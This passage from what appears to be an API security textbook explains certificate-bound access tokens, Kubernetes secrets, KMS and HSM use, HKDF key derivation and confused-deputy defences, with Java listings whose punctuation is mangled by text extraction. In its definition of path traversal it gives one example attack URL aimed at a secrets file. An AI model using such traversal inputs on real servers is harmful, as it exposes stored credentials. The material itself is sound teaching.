the  process  by  which  an  API  enforces  a  certificate-bound  access token  using  token  introspection.  When  the  client  accesses  the  API,  it  presents  its access token as normal. The API introspects the token by calling the AS token intro- spection endpoint  chapter 7 , which will return the cnf claim along with the other token details. The API can then compare the hash value in this claim to the client cer- tificate associated with the TLS session from the client.   In both cases, the API can check that the client has authenticated with the same certificate by comparing the hash with the client certificate used to authenticate at the TLS layer. Listing 11.9 shows how to calculate the hash of the certificate, known as a thumbprint in the JOSE specifications, using the java.security.MessageDigest class that you used in chapter 4. The hash should be calculated over the full binary encod- ing of the certificate, which is what the certificate.getEncoded   method returns. Open the OAuth2TokenStore.java file in your editor and add the thumbprint method from the listing.  DEFINITION A  certificate  thumbprint  or  fingerprint  is  a  cryptographic  hash  of the encoded bytes of the certificate.  Listing 11.9 Calculating a certificate thumbprint  private byte[] thumbprint X509Certificate certificate  {     try {         var sha256 = MessageDigest.getInstance "SHA-256" ;             return sha256.digest certificate.getEncoded   ;           } catch  Exception e  {         throw new RuntimeException e ;     } }  Use a SHA-256  MessageDigest  instance.  Hash the bytes  of the entire  certificate.   412  CHAPTER 11 Securing service-to-service APIs  The client obtains a certiﬁcatebound access token from the AS.  AS  1.

Access API  API  The API compares the certiﬁcate binding to the certiﬁcate the client has authenticated the connection with.  4. Check client cert matches  certiﬁcate binding  Figure 11.7 When a client obtains a certificate-bound access token and then uses it  to access an API, the API can discover the certificate binding using token introspection.  The introspection response will contain a "cnf" claim containing a hash of the client  certificate. The API can then compare the hash to the certificate the client has used to  authenticate the TLS connection to the API and reject the request if it is different.  To  enforce  a  certificate  binding  on  an  access  token,  you  need  to  check  the  token introspection response for a cnf field containing a confirmation key. The confirma- tion key is a JSON object whose fields are the confirmation methods and the values are the determined by each method. Loop through the required confirmation meth- ods as shown in listing 11.9 to ensure that they are all satisfied. If any aren’t satisfied, or your API doesn’t understand any of the confirmation methods, then you should reject the request so that a client can’t access your API without all constraints being respected.  TIP The JWT specification for confirmation methods  RFC 7800, https:  tools .ietf.org html rfc7800   requires  only  a  single  confirmation  method  to  be specified. For robustness, you should check for other confirmation methods and reject the request if there are any that your API doesn’t understand.  Listing 11.9 shows how to enforce a certificate-bound access token constraint by check- ing for an x5tS256 confirmation method. If a match is found, Base64url-decode the   Mutual TLS authentication  413  confirmation key value to obtain the expected hash of the client certificate. This can then  be  compared  against  the  hash  of  the  actual  certificate  the  client  has  used  to authenticate to the API. In this example, the API is running behind the NGINX ingress controller, so the certificate is extracted from the ssl-client-cert header.   CAUTION Remember  to  check  the  ssl-client-verify  header  to  ensure the certificate authentication succeeded; otherwise, you shouldn’t trust the certificate.  If the client had directly connected to the Java API server, then the certificate is avail- able through a request attribute:  var cert =  X509Certificate  request.attributes          "javax.servlet.request.X509Certificate" ;  You can reuse the decodeCert method from the UserController to decode the certif- icate from the header and then compare the hash from the confirmation key to the certificate thumbprint using the MessageDigest.isEqual method. Open the OAuth2- TokenStore.java file and update the processResponse method to enforce certificate- bound access tokens as shown in the following listing.  Listing 11.10 Verifying a certificate-bound access token  private Optional  processResponse JSONObject response,         Request originalRequest  {     var expiry = Instant.ofEpochSecond response.getLong "exp"  ;     var subject = response.getString "sub" ;  Loop through the confirmation methods to ensure all are satisfied.      var confirmationKey = response.optJSONObject "cnf" ;         if  confirmationKey != null  {         for  var method : confirmationKey.keySet    {                         if  !"x5tS256".equals method   {                                       throw new RuntimeException                                                  "Unknown confirmation method: " + method ;              }                                                                   if  !"SUCCESS".equals                                     Reject the request if                    originalRequest.headers "ssl-client-verify"    {   no valid certificate                 return Optional.empty  ;                              is provided.             }                                                                     var expectedHash = Base64url.decode                                     confirmationKey.getString method  ;                     var cert = UserController.decodeCert                                         originalRequest.headers "ssl-client-cert"  ;                 var certHash = thumbprint cert ;                                     if  !MessageDigest.isEqual expectedHash, certHash   {                    return Optional.empty  ;                                         }                                                                }     }  Decode the client certificate and compare the hash, rejecting if they don’t match.      var token = new Token expiry, subject ;  Check if a  confirmation key  is associated  with the token.  If there are any  unrecognized  confirmation  methods, then  reject the request.  Extract the expected  hash from the  confirmation key.   414  CHAPTER 11 Securing service-to-service APIs      token.attributes.put "scope", response.getString "scope"  ;     token.attributes.put "client_id",             response.optString "client_id"  ;      return Optional.of token ; }  An important point to note is that an API can verify a certificate-bound access token purely by comparing the hash values, and doesn’t need to validate certificate chains, check basic constraints, or even parse the certificate at all!6 This is because the author- ity to perform the API operation comes from the access token and the certificate is being  used  only  to  prevent  that  token  being  stolen  and  used  by  a  malicious  client. This significantly reduces the complexity of supporting client certificate authentica- tion for API developers. Correctly validating an X.509 certificate is difficult and has historically been a source of many vulnerabilities. You can disable CA verification at the ingress controller by using the optional_no_ca option discussed in section 11.4.2, because  the  security  of  certificate-bound  access  tokens  depends  only  on  the  client using  the  same  certificate  to  access  an  API  that  it  used  when  the  token  was  issued, regardless of who issued that certificate.  TIP The  client  can  even  use  a  self-signed  certificate  that  it  generates  just before calling the token endpoint, eliminating the need for a CA for issuing client certificates.  At the time of writing, only a few AS vendors support certificate-bound access tokens, but it’s likely this will increase as the standard has been widely adopted in the financial sector. Appendix A has instructions on installing an evaluation version of ForgeRock Access Management 6.5.2, which supports the standard.  Certificate-bound tokens and public clients An interesting aspect of the OAuth2 mTLS specification is that a client can request certificate-bound access tokens even if they don’t use mTLS for client authentication. In fact, even a public client with no credentials at all can request certificate-bound tokens! This can be very useful for upgrading the security of public clients. For exam- ple, a mobile app is a public client because anybody who downloads the app could decompile  it  and  extract  any  credentials  embedded  in  it.  However,  many  mobile phones now come with secure storage in the hardware of the phone. An app can gen- erate  a  private  key  and  self-signed  certificate  in  this  secure  storage  when  it  first starts up and then present this certificate to the AS when it obtains an access token to bind that token to its private key. The APIs that the mobile app then accesses with the token can verify the certificate binding based purely on the hash associated with the token, without the client needing to obtain a CA-signed certificate.  6 The code in listing 11.9 does parse the certificate as a side effect of decoding the header with a Certificate-  Factory, but you could avoid this if you wanted to.    Managing service credentials  415  Pop quiz 8 Which of the following checks must an API perform to enforce a certificate-bound  access token? Choose all essential checks. a Check the certificate has not expired. b Ensure the certificate has not expired. c Check basic constraints in the certificate. d Check the certificate has not been revoked. e Verify that the certificate was issued by a trusted CA. f Compare the x5tS256 confirmation key to the SHA-256 of the certificate the  client used when connecting.  9  True or False: A client can obtain certificate-bound access tokens only if it also uses the certificate for client authentication.  The answers are at the end of the chapter.  11.5 Managing service credentials  Whether you use client secrets, JWT bearer tokens, or TLS client certificates, the cli- ent will need access to some credentials to authenticate to other services or to retrieve an access token to use for service-to-service calls. In this section, you’ll learn how to distribute  credentials  to  clients  securely.  The  process  of  distributing,  rotating,  and revoking  credentials  for  service  clients  is  known  as  secrets  management.  Where  the secrets are cryptographic keys, then it is alternatively known as key management.  DEFINITION Secrets management is the process of creating, distributing, rotat- ing,  and  revoking  credentials  needed  by  services  to  access  other  services. Key  management  refers  to  secrets  management  where  the  secrets  are  cryp- tographic keys.  11.5.1 Kubernetes secrets  You’ve already used Kubernetes’ own secrets management mechanism in chapter 10, known simply as secrets. Like other resources in Kubernetes, secrets have a name and live in a namespace, alongside pods and services. Each named secret can have any num- ber of named secret values. For example, you might have a secret for database creden- tials containing a username and password as separate fields, as shown in listing 11.11. Just like other resources in Kubernetes, they can be created from YAML configuration files.  The  secret  values  are  Base64-encoded,  allowing  arbitrary  binary  data  to  be included. These values were created using the UNIX echo and Base64 commands:  echo -n 'dbuser'  base64  TIP Remember to use the -n option to the echo command to avoid an extra newline character being added to your secrets.   416  CHAPTER 11 Securing service-to-service APIs  WARNING Base64 encoding is not encryption. Don’t check secrets YAML files directly into a source code repository or other location where they can be eas- ily read.  Listing 11.11 Kubernetes secret example  apiVersion: v1 kind: Secret      metadata:   name: db-password           namespace: natter-api     type: Opaque data:   username: ZGJ1c2Vy        password: c2VrcmV0       The kind field indicates  this is a secret.  Give the secret a name  and a namespace.  The secret has two fields with  Base64-encoded values.  You can also define secrets at runtime using kubectl. Run the following command to define a secret for the Natter API database username and password:  kubectl create secret generic db-password -n natter-api \     --from-literal=username=natter \     --from-literal=password=password  TIP Kubernetes  can  also  create  secrets  from  files  using  the  --from-file =username.txt syntax. This avoids credentials being visible in the history of your terminal shell. The secret will have a field named username.txt with the binary contents of the file.  Kubernetes defines three types of secrets:   The most general are generic secrets, which are arbitrary sets of key-value pairs, such as the username and password fields in listing 11.11 and in the previous example. Kubernetes performs no special processing of these secrets and just makes them available to your pods.   A TLS secret consists of a PEM-encoded certificate chain along with a private key. You used a TLS secret in chapter 10 to provide the server certificate and key to the Kubernetes ingress controller. Use kubectl create secret tls to create a TLS secret.   A Docker registry secret is used to give Kubernetes credentials to access a private Docker container registry. You’d use this if your organization stores all images in a private registry rather than pushing them to a public registry like Docker Hub. Use kubectl create secret docker-registry.  For your own application-specific secrets, you should use the generic secret type.   Once you’ve defined a secret, you can make it available to your pods in one of  two ways:   As files mounted in the filesystem inside your pods. For example, if you mounted the secret defined in listing 11.11 under the path  etc secrets db, then you   Managing service credentials  417  would end up with two files inside your pod:  etc secrets db username and  etc secrets db password. Your application can then read these files to get the secret values. The contents of the files will be the raw secret values, not the Base64-encoded ones stored in the YAML.   As environment variables that are passed to your container processes when they first run. In Java you can then access these through the System.getenv String name  method call.  TIP File-based  secrets  should  be  preferred  over  environment  variables.  It’s easy to read the environment of a running process using kubectl  describe pod,  and  you  can’t  use  environment  variables  for  binary  data  such  as  keys. File-based  secrets are also updated  when  the  secret changes, while environ- ment variables can only be changed by restarting the pod.  Listing 11.12 shows how to expose the Natter database username and password to the pods in the Natter API deployment by updating the natter-api-deployment.yaml file. A secret  volume  is  defined  in  the  volumes  section  of  the  pod  spec,  referencing  the named secret to be exposed. In a volumeMounts section for the individual container, you can then mount the secret volume on a specific path in the filesystem. The new lines are highlighted in bold.

Open the Main .java file and update the method according to the listing. The new lines are high- lighted in bold.

You can rebuild the Docker image by running7  mvn clean compile jib:dockerBuild  then reload the deployment configuration to ensure the secret is mounted:  kubectl apply -f kubernetes natter-api-deployment.yaml  Finally, you can restart Minikube to pick up the latest changes:  minikube stop && minikube start  Use kubectl get pods -n natter-api --watch to verify that all pods start up correctly after the changes.  7 Remember to run eval $ minikube docker-env  if this is a new terminal session.   Managing service credentials  419  Managing Kubernetes secrets Although you can treat Kubernetes secrets like other configuration and store them in your version control system, this is not a wise thing to do for several reasons:   Credentials should be kept secret and distributed to as few people as possi- ble. Storing secrets in a source code repository makes them available to all developers with access to that repository. Although encryption can help, it is easy to get wrong, especially with complex command-line tools such as GPG.  Secrets should be different in each environment that the service is deployed to; the database password should be different in a development environment compared  to  your  test  or  production  environments.  This  is  the  opposite requirement to source code, which should be identical  or close to it  between environments.   There is almost no value in being able to view the history of secrets. Although you may want to revert the most recent change to a credential if it causes an outage,  nobody  ever  needs  to  revert  to  the  database  password  from  two years ago. If a mistake is made in the encryption of a secret that is hard to change, such as an API key for a third-party service, it’s difficult to completely delete the exposed value from a distributed version control system.  A better solution is to either manually manage secrets from the command line, or else  use  a  templating  system  to  generate  secrets  specific  to  each  environment. Kubernetes supports a templating system called Kustomize, which can generate per- environment secrets based on templates. This allows the template to be checked into version control, but the actual secrets are added during a separate deployment step. See http:  mng.bz Mov7 for more details.  SECURITY OF KUBERNETES SECRETS Although Kubernetes secrets are easy to use and provide a level of separation between sensitive credentials and other source code and configuration data, they have some drawbacks from a security perspective:   Secrets are stored inside an internal database in Kubernetes, known as etcd. By default, etcd is not encrypted, so anyone who gains access to the data storage can read the values of all secrets. You can enable encryption by following the instructions in http:  mng.bz awZz.  WARNING The official Kubernetes documentation lists aescbc as the stron- gest encryption method supported. This is an unauthenticated encryption mode and potentially vulnerable to padding oracle attacks as you’ll recall from  chapter  6.  You  should  use  the  kms  encryption  option  if  you  can, because all modes other than kms store the encryption key alongside the encrypted data, providing only limited security. This was one of the find- ings of the Kubernetes security audit conducted in 2019  https:  github .com trailofbits audit-kubernetes .   420  CHAPTER 11 Securing service-to-service APIs  11.5.2 Key and secret management services   Anybody with the ability to create a pod in a namespace can use that to read the contents of any secrets defined in that namespace. System administrators with root access to nodes can retrieve all secrets from the Kubernetes API.   Secrets on disk may be vulnerable to exposure through path traversal or file expo- sure vulnerabilities. For example, Ruby on Rails had a recent vulnerability in its template system that allowed a remote attacker to view the contents of any file by  sending specially-crafted  HTTP  headers   https:  nvd.nist.gov vuln detail  CVE-2019-5418 .  DEFINITION A  file  exposure  vulnerability  occurs  when  an  attacker  can  trick  a server into revealing the contents of files on disk that should not be accessible externally.  A  path  traversal  vulnerability  occurs  when  an  attacker  can  send  a URL to a webserver that causes it to serve a file that was intended to be private. For example, an attacker might ask for the file  public .. .. .. etc secrets db- password. Such vulnerabilities can reveal Kubernetes secrets to attackers.  An alternative to Kubernetes secrets is to use a dedicated service to provide credentials to your application. Secrets management services store credentials in an encrypted data- base and make the available to services over HTTPS or a similar secure protocol. Typi- cally, the client needs an initial credential to access the service, such as an API key or client  certificate,  which  can  be  made  available  via  Kubernetes  secrets  or  a  similar mechanism. All other secrets are then retrieved from the secrets management service. Although this may sound no more secure than using Kubernetes secrets directly, it has several advantages:   The storage of the secrets is encrypted by default, providing better protection  of secret data at rest.   The secret management service can automatically generate and update secrets regularly. For example, Hashicorp Vault  https:  www.vaultproject.io  can auto- matically  create  short-lived  database  users  on  the  fly,  providing  a  temporary username  and  password.  After  a  configurable  period,  Vault  will  delete  the account again. This can be useful to allow daily administration tasks to run with- out leaving a highly privileged account enabled at all times.    Fine-grained  access  controls  can  be  applied,  ensuring  that  services  only  have  access to the credentials they need.   All access to secrets can be logged, leaving an audit trail. This can help to estab- lish  what  happened  after  a  breach,  and  automated  systems  can  analyze  these logs and alert if unusual access requests are noticed.  When the credentials being accessed are cryptographic keys, a Key Management Service  KMS   can  be  used.  A  KMS,  such  as  those  provided  by  the  main  cloud  providers, securely  stores  cryptographic  key  material.  Rather  than  exposing  that  key  material directly, a client of a KMS sends cryptographic operations to the KMS; for example,   Managing service credentials  421  requesting that a message is signed with a given key. This ensures that sensitive keys are never directly exposed, and allows a security team to centralize cryptographic ser- vices, ensuring that all applications use approved algorithms.  DEFINITION A Key Management Service  KMS  stores keys on behalf of applica- tions. Clients send requests to perform cryptographic operations to the KMS rather than asking for the key material itself. This ensures that sensitive keys never leave the KMS.  To reduce the overhead of calling a KMS to encrypt or decrypt large volumes of data, a technique known as envelope encryption can be used. The application generates a ran- dom AES key and uses that to encrypt the data locally. The local AES key is known as a data  encryption  key   DEK .  The  DEK  is  then  itself  encrypted  using  the  KMS.  The encrypted DEK can then be safely stored or transmitted alongside the encrypted data. To decrypt, the recipient first decrypts the DEK using the KMS and then uses the DEK to decrypt the rest of the data.  DEFINITION In  envelope  encryption,  an  application  encrypts  data  with  a  local data encryption key  DEK . The DEK is then encrypted  or wrapped  with a key encryption key  KEK  stored in a KMS or other secure service. The KEK itself might be encrypted with another KEK creating a key hierarchy.  For both secrets management and KMS, the client usually interacts with the service using a REST API. Currently, there is no common standard API supported by all pro- viders. Some cloud providers allow access to a KMS using the standard PKCS11 API used by hardware security modules. You can access a PKCS11 API in Java through the Java Cryptography Architecture, as if it was a local keystore, as shown in listing 11.14.  This  listing  is  just  to  show  the  API;  you  don’t  need  to  type  it  in.   Java  exposes  a PKCS11 device, including a remote one such as a KMS, as a KeyStore object with the type "PKCS11".8 You can load the keystore by calling the load   method, providing a null InputStream argument  because there is no local keystore file to open  and pass- ing the KMS password or other credential as the second argument. After the PKCS11 keystore has been loaded, you can then load keys and use them to initialize Signature and Cipher objects just like any other local key. The difference is that the Key object returned by the PKCS11 keystore has no key material inside it. Instead, Java will auto- matically forward cryptographic operations to the KMS via the PKCS11 API.  TIP Java’s built-in PKCS11 cryptographic provider only supports a few algo- rithms, many of which are old and no longer recommended. A KMS vendor may offer their own provider with support for more algorithms.  8  If you’re using the IBM JDK, use the name “PKCS11IMPLKS” instead.   422  CHAPTER 11 Securing service-to-service APIs  Listing 11.14 Accessing a KMS through PKCS11  var keyStore = KeyStore.getInstance "PKCS11" ;      var keyStorePassword = "changeit".toCharArray  ;    keyStore.load null, keyStorePassword ;               Load the PKCS11 keystore  with the correct password.  var signingKey =  PrivateKey  keyStore.getKey "rsa-key",           keyStorePassword ;                                  Retrieve a key object  from the keystore.  var signature = Signature.getInstance "SHA256WithRSA" ;    signature.initSign signingKey ;                            signature.update "Hello!".getBytes UTF_8  ;                var sig = signature.sign  ;                                 Use the key to  sign a message.  PKCS11 and hardware security modules PKCS11, or Public Key Cryptography Standard 11, defines a standard API for inter- acting with hardware security modules  HSMs . An HSM is a hardware device dedi- cated to secure storage of cryptographic keys. HSMs range in size from tiny USB keys that support just a few keys, to rack-mounted network HSMs that can handle thou- sands of requests per second  and cost tens of thousands of dollars . Just like a KMS, the key material can’t normally be accessed directly by clients and they instead send cryptographic requests to the device after logging in. The API defined by PKCS11, known as Cryptoki, provides operations in the C programming language for logging into the HSM, listing available keys, and performing cryptographic operations.   Unlike a purely software KMS, an HSM is designed to offer protection against an attacker with physical access to the device. For example, the circuitry of the HSM may be encased in tough resin with embedded sensors that can detect anybody trying to tamper with the device, in which case the secure memory is wiped to prevent com- promise. The US and Canadian governments certify the physical security of HSMs under the FIPS 140-2 certification program, which offers four levels of security: level 1 certified devices offer only basic protection of key material, while level 4 offers pro- tection  against  a  wide  range  of  physical  and  environmental  threats.  On  the  other hand, FIPS 140-2 offers very little validation of the quality of implementation of the algorithms running on the device, and some HSMs have been found to have serious software security flaws. Some cloud KMS providers can be configured to use FIPS 140-2 certified  HSMs for storage of keys, usually at an increased cost. However, most such services are already running in physically secured data centers, so the additional physical protection is usually unnecessary.  A KMS can be used to encrypt credentials that are then distributed to services using Kubernetes secrets. This provides better protection than the default Kubernetes con- figuration  and  enables  the  KMS  to  be  used  to  protect  secrets  that  aren’t  cryp- tographic keys. For example, a database connection password can be encrypted with the KMS and then the encrypted password is distributed to services as a Kubernetes secret. The application can then use the KMS to decrypt the password after loading it from the disk.

While cloud KMS pro- viders often supply an SDK that transparently handles this for you, in many cases the SDK is just reading its credentials from a file on the filesystem or from another source in the environment that the SDK is running in. There is therefore still a risk that an attacker  could  compromise  these  credentials  and  then  use  the  KMS  to  decrypt  the other secrets.  TIP You can often restrict a KMS to only allow your keys to be used from cli- ents  connecting  from  a  virtual  private  cloud   VPC   that  you  control.  This makes it harder for an attacker to use compromised credentials because they can’t directly connect to the KMS over the internet.  A solution to this problem is to use short-lived tokens to grant access to the KMS or secrets manager. Rather than deploying a username and password or other static cre- dential  using  Kubernetes  secrets,  you  can  instead  generate  a  temporary  credential with  a  short  expiry  time.  The  application  uses  this  credential  to  access  the  KMS  or secrets  manager  at  startup  and  decrypt  the  other  secrets  it  needs  to  operate.  If  an attacker later compromises the initial token, it will have expired and can’t be used. For  example,  Hashicorp  Vault   https:  vaultproject.io   supports  generating  tokens with a limited expiry time which a client can then use to retrieve other secrets from the vault.    424  CHAPTER 11 Securing service-to-service APIs  CAUTION The techniques in this section are significantly more complex than other  solutions.  You  should  carefully  weigh  the  increased  security  against your threat model before adopting these approaches.  If you primarily use OAuth2 for access to other services, you can deploy a short-lived JWT  that  the  service  can  use  to  obtain  access  tokens  using  the  JWT  bearer  grant described in section 11.3. Rather than giving clients direct access to the private key to create their own JWTs, a separate controller process generates JWTs on their behalf and distributes these short-lived bearer tokens to the pods that need them. The client then uses the JWT bearer grant type to exchange the JWT for a longer-lived access token  and optionally a refresh token too . In this way, the JWT bearer grant type can be used to enforce a separation of duties that allows the private key to be kept securely away  from  pods  that  service  user  requests.  When  combined  with  certificate-bound access tokens of section 11.4.6, this pattern can result in significantly increased secu- rity for OAuth2-based microservices.    The  main  problem  with  short-lived  credentials  is  that  Kubernetes  is  designed  for highly dynamic environments in which pods come and go, and new service instances can be created to respond to increased load. The solution is to have a controller process register with the Kubernetes API server and watch for new pods being created. The con- troller process can then create a new temporary credential, such as a fresh signed JWT, and deploy it to the pod before it starts up. The controller process has access to long- lived credentials but can be deployed in a separate namespace with strict network poli- cies to reduce the risk of it being compromised, as shown in figure 11.8.  The Kubernetes API server informs the controller when a new pod is created.  The controller uses its private key to create a short-lived JWT.  Kubernetes API  server  Controller  AS  Control plane  Data plane  The JWT is deployed to the pod.  New pod  The pod exchanges the JWT for an access token using the JWT Bearer grant.  Figure 11.8 A controller process running in a separate control plane  namespace can register with the Kubernetes API to watch for new pods. When  a new pod is created, the controller uses its private key to sign a short-lived  JWT, which it then deploys to the new pod. The pod can then exchange the JWT  for an access token or other long-lived credentials.   Managing service credentials  425  A production-quality implementation of this pattern is available, again for Hashicorp Vault,  as  the  Boostport  Kubernetes-Vault  integration  project   https:  github.com  Boostport kubernetes-vault . This controller can inject unique secrets into each pod, allowing the pod to connect to Vault to retrieve its other secrets. Because the initial secrets  are  unique  to  a  pod,  they  can  be  restricted  to  allow  only  a  single  use,  after which  the  token  becomes  invalid.  This  ensures  that  the  credential  is  valid  for  the shortest  possible  time.  If  an  attacker  somehow  managed  to  compromise  the  token before the pod used it, then the pod will noisily fail to start up when it fails to connect to Vault, providing a signal to security teams that something unusual has occurred.  11.5.4 Key derivation  A complementary approach to secure distribution of secrets is to reduce the number of secrets your application needs in the first place. One way to achieve this is to derive cryptographic keys for different purposes from a single master key, using a key deriva- tion function  KDF . A KDF takes the master key and a context argument, which is typ- ically a string, and returns one or more new keys as shown in figure 11.9. A different context argument results in completely different keys and each key is indistinguish- able from a completely random key to somebody who doesn’t know the master key, making them suitable as strong cryptographic keys.  A KDF uses a master key and a context string as inputs.  Master key  "jwt-enc-key"  KDF  Context string  Derived key  Different context strings produce different derived keys.  Figure 11.9 A key derivation  function  KDF  takes a master key  and context string as inputs and  produces derived keys as outputs.  You can derive an almost unlimited  number of strong keys from a single  high-entropy master key.  If you recall from chapter 9, macaroons work by treating the HMAC tag of an existing token as a key when adding a new caveat. This works because HMAC is a secure pseudo- random function, which means that its outputs appear completely random if you don’t know the key. This is exactly what we need to build a KDF, and in fact HMAC is used as the basis for a widely used KDF called HKDF  HMAC-based KDF, https:  tools.ietf.org  html rfc5869 . HKDF consists of two related functions:   HKDF-Extract takes as input a high-entropy input that may not be suitable for direct use as a cryptographic key and returns a HKDF master key. This function   426  CHAPTER 11 Securing service-to-service APIs  is useful in some cryptographic protocols but can be skipped if you already have a valid HMAC key. You won’t use HKDF-Extract in this book.   HKDF-Expand takes the master key and a context and produces an output key of  any requested size.  DEFINITION HKDF  is  a  HMAC-based  KDF  based  on  an  extract-and-expand method. The expand function can be used on its own to generate keys from a master HMAC key.  Listing 11.15 shows an implementation of HKDF-Expand using HMAC-SHA-256. To generate  the  required  amount  of  output  key  material,  HKDF-Expand  performs  a loop. Each iteration of the loop runs HMAC to produce a block of output key material with the following inputs:  1 The HMAC tag from the last time through the loop unless this is the first loop. 2 The context string. 3 A block counter byte, which starts at 1 and is incremented each time.  With  HMAC-SHA-256  each  iteration  of  the  loop  generates  32  bytes  of  output  key material, so you’ll typically only need one or two loops to generate a big enough key for most algorithms. Because the block counter is a single byte, and cannot be 0, you can only  loop  a  maximum  of  255  times,  which  gives  a  maximum  key  size  of  8,160  bytes. Finally, the output key material is converted into a Key object using the javax.crypto .spec.SecretKeySpec  class.  Create  a  new  file  named  HKDF.java  in  the  src main  java com manning apisecurityinaction folder with the contents of the file.  TIP If the master key lives in a HSM or KMS then it is much more efficient to combine the inputs into a single byte array rather than making multiple calls to the update   method.  Listing 11.15 HKDF-Expand  package com.manning.apisecurityinaction;  import javax.crypto.Mac; import javax.crypto.spec.SecretKeySpec; import java.security.*;  import static java.nio.charset.StandardCharsets.UTF_8; import static java.util.Objects.checkIndex;  public class HKDF {     public static Key expand Key masterKey, String context,                              int outputKeySize, String algorithm              throws GeneralSecurityException {         checkIndex outputKeySize, 255*32 ;               var hmac = Mac.getInstance "HmacSHA256" ;             hmac.init masterKey ;                          Initialize the Mac  with the master key.  Ensure the caller didn’t ask for too much key material.   Managing service credentials  427          var output = new byte[outputKeySize];         var block = new byte[0];         for  int i = 0; i < outputKeySize; i += 32  {                 hmac.update block ;                 hmac.update context.getBytes UTF_8  ;                  hmac.update  byte    i   32  + 1  ;                    block = hmac.doFinal  ;                                   System.arraycopy block, 0, output, i,                             Math.min outputKeySize - i, 32  ;             }  Include the output block of the last loop in the new HMAC.  Loop until the  requested output size  has been generated.  Include the context string and  the current block counter.  Copy the new HMAC  tag to the next block  of output.          return new SecretKeySpec output, algorithm ;     } }  You can now use this to generate as many keys as you want from an initial HMAC key. For example, you can open the Main.java file and replace the code that loads the AES encryption  key  from  the  keystore  with  the  following  code  that  derives  it  from  the HMAC key instead as shown in the bold line here:  var macKey = keystore.getKey "hmac-key", "changeit".toCharArray   ; var encKey = HKDF.expand macKey, "token-encryption-key",         32, "AES" ;  WARNING A cryptographic key should be used for a single purpose. If you use a HMAC key for key derivation, you should not use it to also sign messages. You can use HKDF to derive a second HMAC key to use for signing.  You can generate almost any kind of symmetric key using this method, making sure to use a distinct context string for each different key. Key pairs for public key cryp- tography generally can’t be generated in this way, as the keys are required to have some mathematical structure that is not present in a derived random key. However, the Salty Coffee library used in chapter 6 contains methods for generating key pairs for public key encryption and for digital signatures from a 32-byte seed, which can be used as follows:  var seed = HKDF.expand macKey, "nacl-signing-key-seed",             32, "NaCl" ;                                        var keyPair = Crypto.seedSigningKeyPair seed.getEncoded   ;       Use HKDF to  generate a seed.  Derive a signing keypair from the seed.  CAUTION The  algorithms  used  by  Salty  Coffee,  X25519  and  Ed25519,  are designed to safely allow this. The same is not true of other algorithms.  Although generating a handful of keys from a master key may not seem like much of a savings, the real value comes from the ability to generate keys programmatically that are the same on all servers. For example, you can include the current date in the context  string  and  automatically  derive  a  fresh  encryption  key  each  day  without needing to distribute a new key to every server. If you include the context string in the   428  CHAPTER 11 Securing service-to-service APIs  encrypted  data,  for  example  as the  kid  header  in  an  encrypted  JWT, then  you  can quickly re-derive the same key whenever you need without storing previous keys.  Facebook CATs As you might expect, Facebook needs to run many services in production with numer- ous clients connecting to each service. At the huge scale they are running at, public key cryptography is deemed too expensive, but they still want to use strong authen- tication between clients and services. Every request and response between a client and a service is authenticated with HMAC using a key that is unique to that client- service pair. These signed HMAC tokens are known as Crypto Auth Tokens, or CATs, and are a bit like signed JWTs.   To avoid storing, distributing, and managing thousands of keys, Facebook uses key derivation heavily. A central key distribution service stores a master key. Clients and services  authenticate to  the  key distribution service  to  get  keys  based on their identity.  The  key  for  a  service  with  the  name  “AuthService”  is  calculated  using KDF masterKey, "AuthService" , while the key for a client named “Test” to talk to the auth service is calculated as KDF KDF masterKey, "AuthService" , "Test" . This allows Facebook to quickly generate an almost unlimited number of client and service keys from the single master key. You can read more about Facebook’s CATs at https:  eprint.iacr.org 2018 413.

Because service credentials are often more privileged than normal users, an attacker may be able to trick the service to per- forming malicious actions on their behalf.   You can avoid confused deputy  attacks in service-to-service calls that  are  carried out  in  response  to  user  requests  by  ensuring  that  access  control  decisions  made  in backend services include the context of the original request. The simplest solution is for frontend services to pass along the username or other identifier of the user that   Service API calls in response to user requests  429  Kubernetes critical API server vulnerability In 2018, the Kubernetes project itself reported a critical vulnerability allowing this kind  of  confused  deputy  attack   https:  rancher.com blog 2018 2018-12-04-k8s- cve  . In the attack, a user made an initial request to the Kubernetes API server, which authenticated the request and applied access control checks. It then made its own connection to a backend service to fulfill the request. This API request to the backend service used highly privileged Kubernetes service account credentials, pro- viding administrator-level access to the entire cluster. The attacker could trick Kuber- netes  into  leaving  the  connection  open,  allowing  the  attacker  to  send  their  own commands to the backend service using the service account. The default configura- tion permitted even unauthenticated users to exploit the vulnerability to execute any commands on backend servers. To make matters worse, Kubernetes audit logging filtered out all activity from system accounts so there was no trace that an attack had taken place.  11.6.1 The phantom token pattern  made the original request. The backend service can then make an access control deci- sion based on the identity of this user rather than solely on the identity of the calling service.  Service-to-service  authentication  is  used  to  establish  that  the  request  comes from a trusted source  the frontend service , and permission to perform the action is determined based on the identity of the user indicated in the request.  TIP As you’ll recall from chapter 9, capability-based security can be used to systematically eliminate confused deputy attacks. If the authority to perform an operation is encapsulated as a capability, this can be passed from the user to all backend services involved in implementing that operation. The author- ity to perform an operation comes from the capability rather than the identity of the service making a request, so an attacker can’t request an operation they don’t have a capability for.  Although passing the username of the original user is simple and can avoid confused deputy attacks, a compromised frontend service can easily impersonate any user by sim- ply including their username in the request. An alternative would be to pass down the token originally presented by the user, such as an OAuth2 access token or JWT. This allows backend services to check that the token is valid, but it still has some drawbacks:  If the access token requires introspection to check validity, then a network call to the AS has to be performed at each microservice that is involved in process- ing a request. This can add a lot of overhead and additional delays.   On the other hand, backend microservices have no way of knowing if a long- lived  signed  token  such  as  a  JWT  has  been  revoked  without  performing  an introspection request.   A compromised microservice can take the user’s token and use it to access other services, effectively impersonating the user. If service calls cross trust boundaries,   430  CHAPTER 11 Securing service-to-service APIs  such as when calls are made to external services, the risk of exposing the user’s token increases.  The first two points can be addressed through an OAuth2 deployment pattern imple- mented by some API gateways, shown in figure 11.10. In this pattern, users present long-lived access tokens to the API gateway which performs a token introspection call to the AS to ensure the token is valid and hasn’t been revoked. The API gateway then takes the contents of the introspection response, perhaps augmented with additional information  about  the  user   such  as  roles  or  group  memberships   and  produces  a short-lived JWT signed with a key trusted by all the microservices behind the gateway. The gateway then forwards the request to the target microservices, replacing the orig- inal access token with this short-lived JWT. This is sometimes referred to as the phan- tom token pattern. If a public key signature is used for the JWT then microservices can validate the token but not create their own.  AS  The API gateway introspects incoming access tokens by calling the AS.  Introspect token  Microservice  Access token  API gateway  Signed JWT  Microservice  The gateway signs a short-lived JWT with its own private key.  Microservice  Backend microservices validate the JWT rather than calling the AS.  Figure 11.10 In the phantom token pattern, an API gateway 